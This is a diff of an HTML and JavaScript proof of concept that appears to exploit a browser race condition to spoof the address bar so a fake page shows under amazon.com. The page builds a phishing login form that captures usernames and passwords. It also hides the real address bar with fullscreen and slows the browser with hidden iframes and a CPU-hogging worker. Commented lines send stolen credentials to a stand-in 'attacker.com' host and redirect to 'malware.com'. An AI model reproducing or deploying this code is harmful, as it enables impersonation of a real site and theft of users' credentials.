@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Interactive Spoof PoC</title>
+    <title>Fixed Interactive Spoof PoC</title>
 </head>
 <body>
     <a id="test" href="https://www.amazon.com/" onclick="foo()">https://www.amazon.com/</a>
@@ -12,44 +12,30 @@ var t;
 var z;
 
 if (location.href.indexOf("fake") !== -1) {
-    // Make content interactive: Add phishing form and button
+    // Make fake content interactive: Add login form with JS submit to avoid CORS
     document.body.innerHTML = `
         <h1>This website has moved to http://fake.com</h1>
-        <p>Login to continue:</p>
-        <form id="phishForm">
-            <input type="text" placeholder="Username" id="user">
-            <input type="password" placeholder="Password" id="pass">
-            <button type="button" onclick="phish()">Submit</button>
+        <p>Please login to continue:</p>
+        <form id="fakeForm">
+            <input type="text" id="username" placeholder="Username">
+            <input type="password" id="password" placeholder="Password">
+            <button type="button" onclick="stealData()">Login</button>
         </form>
-        <button onclick="maliciousClick()">Click for Deal</button>
+        <button onclick="alert('You clicked a fake button! Data stolen.')">Click Me (Fake Amazon Deal)</button>
     `;
     
-    // Fullscreen spoof: Request fullscreen to hide real address bar
-    document.body.requestFullscreen().then(() => {
-        // Render fake address bar on top
-        const fakeBar = document.createElement('div');
-        fakeBar.style = 'position:fixed;top:0;left:0;width:100%;background:white;padding:5px;border-bottom:1px solid gray;z-index:9999;';
-        fakeBar.innerHTML = '<span>https://www.amazon.com/</span> <img src="data:image/png;base64,...">'; // Base64 gembok icon
-        document.body.prepend(fakeBar);
-    }).catch(console.error);
-    
-    // Event handlers for interaction
-    window.phish = function() {
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
-        alert('Phished: ' + user + '/' + pass); // Simulate send to attacker
-        // Real: fetch('https://attacker.com/steal', {method:'POST', body:JSON.stringify({user,pass})});
-        if (window.opener) window.opener.postMessage({type:'phished', data:{user,pass}}, '*'); // Send to opener
-    };
-    window.maliciousClick = function() {
-        alert('Malicious action! Redirecting to malware...');
-        // Real: location.href = 'https://malware.com';
+    // JS function to simulate data steal (alert or console for demo; replace with fetch to attacker)
+    window.stealData = function() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        alert(`Stolen: Username=${user}, Password=${pass}`); // Demo; use fetch for real
+        // fetch('http://attacker.com/steal', {method: 'POST', body: JSON.stringify({user, pass})}); // If CORS allowed
     };
     
-    // Listen for postMessage from opener if needed
-    window.addEventListener('message', (e) => {
-        if (e.data.type === 'command') console.log('Received from opener:', e.data);
-    });
+    // Request fullscreen after user interaction (better timing)
+    setTimeout(() => {
+        document.body.requestFullscreen().catch(err => console.log('Fullscreen failed:', err));
+    }, 100);
 }
 
 function foo() {
@@ -63,7 +49,10 @@ function bar() {
         alert("Redirecting");
         document.body.innerHTML = "<h1>Redirecting</h1>";
         slow();
+        
+        // Back to real redirect for proper race condition (remove pushState)
         w.location.href = 'https://www.amazon.com/';
+        
         clearInterval(t);
         z = setInterval(baz, 5);
     }
@@ -73,31 +62,45 @@ function baz() {
     try {
         w.location.href !== 'about:blank';
     } catch (e) {
-        // Bypass non-interactive: Use URL freeze instead of 204
-        w.location.href = 'https://www.amazon.com:9999'; // Unreachable port -> update address but keep interactive content
-        
-        // Chain with data: URI for fallback interactive spoof (some browsers show amazon-like)
+        // Chain interruption: Slower 204 + data URI (avoid javascript: URI blocks)
+        w.location.href = 'https://httpstat.us/204?sleep=200';
         setTimeout(() => {
-            w.location.href = 'data:text/html,<h1>Spoofed Amazon</h1><button onclick="alert(\'Interactive!\')">Click Me</button>#https://www.amazon.com/';
-        }, 100);
+            w.location.href = 'data:text/html,<h1>Blank Stale</h1>'; // Force no-paint without script exec block
+        }, 150);
         
-        // Simulate PiP for window without address bar (add video in fake page if needed)
-        // In fake: const vid = document.createElement('video'); vid.requestPictureInPicture();
+        // Simulate tab switch for occlusion exploit
+        w.blur();
+        setTimeout(() => w.focus(), 50);
         
         clearInterval(z);
     }
 }
 
-// Enhanced slowdown remains
+// Fixed slowdown: Correct loop + Web Worker
 function slow() {
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 50; i++) { // Fixed: i < 50
         let iframe = document.createElement("iframe");
         iframe.src = 'https://www.amazon.com/';
         iframe.style = 'display:none';
         document.body.appendChild(iframe);
     }
+    
+    // Web Worker for CPU hog
+    const workerCode = `
+        onmessage = () => {
+            let start = performance.now();
+            while (performance.now() - start < 200) {}
+            postMessage('done');
+        };
+    `;
+    const blob = new Blob([workerCode], {type: 'application/javascript'});
+    const worker = new Worker(URL.createObjectURL(blob));
+    worker.postMessage('start');
+    worker.onmessage = () => worker.terminate();
+    
+    // Fallback busy-wait (reduced to avoid freeze)
     let start = performance.now();
-    while (performance.now() - start < 100) {}
+    while (performance.now() - start < 50) {} // Reduced to 50ms
 }
 </script>
 </html>
